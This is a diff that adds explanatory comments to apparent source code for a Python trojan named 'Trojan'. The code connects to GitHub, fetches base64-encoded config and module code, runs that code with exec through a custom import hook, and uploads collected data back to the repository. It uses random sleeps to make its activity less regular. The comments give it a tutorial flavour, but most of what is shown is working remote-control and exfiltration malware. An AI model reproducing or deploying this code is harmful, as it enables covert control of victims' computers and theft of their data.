@@ -27,7 +27,7 @@ class Trojan:
         self.data_path= f'data/{id}'
         self.repo = github_connect()
         
-    def get_config(self):                                                           #
+    def get_config(self):                                                           #Gather data from config and find all modules listed within
         config_json = getContent('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
         for task in config:
@@ -46,34 +46,34 @@ class Trojan:
         if ':' in message:                                                          #Check if : in message
             message = message.replace(":", "-")                                     #Bypass to ensure files store properly in windows or linux
             print(message)
-        remote_path = f'data/{self.id}/{message}.data'
+        remote_path = f'data/{self.id}/{message}.data'                              #Set file data path
         bindata = bytes('%r' % data, 'utf-8')
-        self.repo.create_file(remote_path, message, base64.b64encode(bindata))
+        self.repo.create_file(remote_path, message, base64.b64encode(bindata))      #Create your file with bit based data
         
-    def run(self):
+    def run(self):                                                                  #Task execution
         while True:
             config = self.get_config()
             for task in config:
                 thread = threading.Thread(target=self.moduleRun, args=(task['module'],))
                 thread.start()
-                time.sleep(random.randint(1,10))
-            time.sleep(random.randint(1, 10))
+                time.sleep(random.randint(1,10))                                    #Delay before tasks run again
+            time.sleep(random.randint(1, 10))                                       #Delay between running times to add descripancy in activities
             
-class GitImport:
+class GitImport:                        
     def __init__(self):
         self.current_module_code= ""
         
-    def find_module(self, name, path=None):
+    def find_module(self, name, path=None):                                         #Attempt to find modules in github
         print("[*]Attempting to retrieve %s" % name)
         self.repo = github_connect()
-        new_library = getContent('modules', f'{name}.py', self.repo)
+        new_library = getContent('modules', f'{name}.py', self.repo)                #check for module in modules and grab data
         if new_library is not None:
-            self.current_module_code = base64.b64decode(new_library)
+            self.current_module_code = base64.b64decode(new_library)                #Create new library
             return self
     
-    def load_module(self, name):
+    def load_module(self, name):                                                    #Load all modules and create if none-existent
         spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
-        new_module = importlib.util.module_from_spec(spec)
+        new_module = importlib.util.module_from_spec(spec)                          
         exec(self.current_module_code, new_module.__dict__)
         sys.modules[spec.name] = new_module
         return new_module
